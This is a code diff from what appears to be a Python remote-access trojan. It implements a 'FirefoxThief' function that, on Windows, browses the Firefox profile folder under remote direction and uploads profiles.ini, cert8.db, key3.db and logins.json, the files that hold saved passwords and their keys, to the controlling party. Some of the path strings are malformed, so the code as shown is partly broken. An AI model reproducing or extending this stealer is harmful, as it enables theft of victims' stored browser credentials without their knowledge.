@@ -97,7 +97,24 @@ def RecvData():
     return temp
 
 def FirefoxThief():
-    # looking for
+    if platform.system() == "Windows":
+        SendData("Ok: Windows supported")
+        if os.path.isdir("%APPDATA%\Mozilla\Firefox\") == True:
+            os.chdir("%APPDATA%\Mozilla\Firefox\")
+            SendData(EXEC("dir"))
+            newDir = RecvData()
+            UploadFILE("profiles.ini")
+            os.chdir("%APPDATA%\Mozilla\Firefox\"+newDir)
+            SendData(EXEC("dir"))
+            newDir2 = RecvData()
+            os.chdir("%APPDATA%\Mozilla\Firefox\"+newDir2)
+            UploadFILE("cert8.db")
+            UploadFILE("key3.db")
+            UploadFILE("logins.json")
+        else:
+            SendData("Error: Firefox directory not found!")
+    else:
+        SendData("Error: not Windows, not supported!")
 
 def DKey(primitiveKey, salt):
     dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
